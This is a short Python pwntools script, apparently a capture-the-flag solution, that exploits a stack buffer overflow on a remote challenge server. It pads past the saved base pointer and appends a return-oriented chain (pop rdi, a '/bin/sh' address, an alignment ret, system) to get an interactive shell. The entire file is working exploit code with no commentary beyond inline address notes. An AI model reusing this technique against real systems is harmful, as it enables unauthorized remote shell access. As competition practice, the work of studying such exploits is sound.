#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13401

def make_payload():

    offset = 112 + 8    #112 of s, 8 of base pointer
    payload = b"A" * offset

    pop_rdi = 0x4011a5  # address of the pop rdi, ret gadget
    bin_sh  = 0x404050 # address of "bin/sh"
    system  = 0x401040 # address of system
    ret_gadget = 0x4011a6  # Extra ret for alignment (16-byte aligned)

    payload += pop_rdi.to_bytes(8, 'little')
    payload += bin_sh.to_bytes(8, 'little')
    payload += (ret_gadget).to_bytes(8, 'little')
    payload += system.to_bytes(8, 'little')

    print(payload)

    return payload

def main():

    server = remote(HOST, PORT)
    server.recvuntil(b'Please enter your name: ', timeout=1)

    payload = make_payload()
    print(f"Sending payload of length {len(payload)}")
    server.sendline(payload)

    # read remainder of program output
    server.interactive()

if __name__ == '__main__':
    main()
